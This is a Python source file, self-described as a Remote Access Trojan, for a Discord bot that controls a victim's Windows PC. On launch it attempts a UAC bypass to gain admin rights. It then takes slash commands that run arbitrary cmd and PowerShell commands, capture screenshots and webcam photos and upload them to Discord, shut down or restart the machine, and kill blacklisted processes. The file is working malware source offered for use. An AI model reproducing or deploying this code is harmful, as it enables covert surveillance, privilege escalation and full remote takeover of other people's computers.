#-----------------------------------------------------------------------------------------------------------------------------------
# This is a RAT(Remote Access Trojaner)
# Author: Deltatoolbox aka TornLotus
# Contact: Discord: tornlotus
# Lizenz: MIT License
# Github: https://github.com/Deltatoolbox/not_learning_by_not_doing
#-----------------------------------------------------------------------------------------------------------------------------------
#normal imports
from interactions import slash_command, SlashContext
from interactions import OptionType, slash_option
from interactions import Client, Intents, listen
from interactions import ChannelType, File
import os
import threading
#my imports
from modules import basic_functions as functions
#local settings
ctx = SlashContext
# Check if the file is in the final folder
config = functions.read_config()
functions.check_location(config["location"])
# Create a ID on start 
functions.create_or_read_id_file()
print(functions.create_or_read_id_file())
#discord set intents
bot = Client(intents=Intents.DEFAULT)
#-----------------------------------------------------------------------------------------------------------------------------------
# on ready
#-----------------------------------------------------------------------------------------------------------------------------------
print(f'is admin: {functions.IsAdmin()}')
if not(functions.IsAdmin()):
    functions.UACbypass(1)
    if not(functions.IsAdmin()):
        functions.UACbypass(2)
print(f'is admin: {functions.IsAdmin()}')
@listen()
async def on_ready():
    category_name = functions.category_name()
    #get guild id
    guild = bot.get_guild(config["guild_id"])  
    channels = await guild.fetch_channels()
    existing_categories = [channel for channel in channels if channel.type == ChannelType.GUILD_CATEGORY]
    # check if category exist, if generate it
    category = next((c for c in existing_categories if c.name == category_name), None)
    if not category:
        category = await guild.create_category(category_name)
    else:
    # check if channel exists, genereate missings
        config_custom = functions.get_ids()
        channel_ids = {"info_channel_id": "info", "main_channel_id": "main", "spam_channel_id": "spam"}
        for channel_id_key, channel_name in channel_ids.items():
            channel_id = config_custom.get(channel_id_key)
            channel = guild.get_channel(channel_id)
            if not channel or channel.parent_id != category.id:
                # genearte channel.
                channel = await category.create_text_channel(channel_name)
                config_custom[channel_id_key] = channel.id
            # save all ids to config.custom.json
            functions.save_ids(config_custom["category_id"], config_custom["info_channel_id"], config_custom["main_channel_id"], config_custom["spam_channel_id"])
    
#-----------------------------------------------------------------------------------------------------------------------------------
# slash commands
#-----------------------------------------------------------------------------------------------------------------------------------

#cmd command
@slash_command(
    name="cmd",
    description="execute a cmd command",
)
@slash_option(
    name="command",
    description="the command to execute",
    required=True,
    opt_type=OptionType.STRING,
)
async def cmd(ctx: SlashContext, command: str):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("cmd can only be executed in main.")
        return
    # execute cmd command (crash save with try)
    try:
        output = functions.exe_cmd(command)
        await ctx.send(f"command output ```{output}```")
    except Exception as e:
        await ctx.send(f"error: {e}")
#shutdown command
@slash_command(
    name="shutdown",
    description="shutdown the pc",
)
async def shutdown(ctx: SlashContext):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("shutdown can only be executed in main.")
        return
    output = functions.shutdown()
    await ctx.send(output)
#restart command
@slash_command(
    name="restart",
    description="restart the pc",
)
async def restart(ctx: SlashContext):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("restart can only be executed in main.")
        return
    output = functions.restart()
    await ctx.send(output)
#powershell command
@slash_command(
    name="powershell",
    description="execute powershell command",
)
@slash_option(
    name="command",
    description="the command to execute",
    required=True,
    opt_type=OptionType.STRING,
)
async def powershell(ctx: SlashContext, command: str):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("powershell can only be executed in main.")
        return
    output = f"command output: ```{functions.powershell(command)}```"
    await ctx.send(output)
#take sc
@slash_command(
    name="screenshot",
    description="make a screenshot",
)
async def screenshot(ctx: SlashContext):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("screenshot can only be executed in main.")
        return
    await functions.take_sc()
    # send sc
    await ctx.send(file=File(f'{os.getcwd()}/sc.png'))
    #remove sc
    os.remove(f'{os.getcwd()}/sc.png')
#blacklist
@slash_command(
    name="blacklist",
    description="blacklist programms",
)
@slash_option(
    name="add",
    description="True=add False=remove blacklist",
    required=True,
    opt_type=OptionType.BOOLEAN,
)
@slash_option(
    name="name",
    description="name off process",
    required=True,
    opt_type=OptionType.STRING,
)
async def blacklist(ctx: SlashContext, add: bool, name: str):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("blacklist can only be executed in main.")
        return
    if (add == True):
        output = functions.add_blacklist(name)
    else:
        output = functions.remove_blacklist(name)
    await ctx.send(output)
#webcam command
@slash_command(
    name="webcam",
    description="take webcam photo",
)
async def webcam(ctx: SlashContext):
    # load all channel ids
    config_custom = functions.get_ids()
    # load channel id
    channel = bot.get_channel(ctx.channel_id)
    # check category
    if channel.parent_id != config_custom["category_id"]:
        return
    # check if channel == main
    if ctx.channel_id != config_custom["main_channel_id"]:
        await ctx.send("webcam can only be executed in main.")
        return
    output = 0
    output = functions.webcam()
    if not (output == 0):
        await ctx.send(output)
    # send photo
    await ctx.send(file=File(f'{os.getcwd()}/web.png'))
    #remove photo
    import time
    time.sleep(5)
    os.remove(f'{os.getcwd()}/web.png')
#-----------------------------------------------------------------------------------------------------------------------------------
# start everything
#-----------------------------------------------------------------------------------------------------------------------------------

# start blacklist thread
monitoring_thread = threading.Thread(target=functions.monitor_blacklisted_programs)
monitoring_thread.start()
#start bot
bot.start(config["token"])
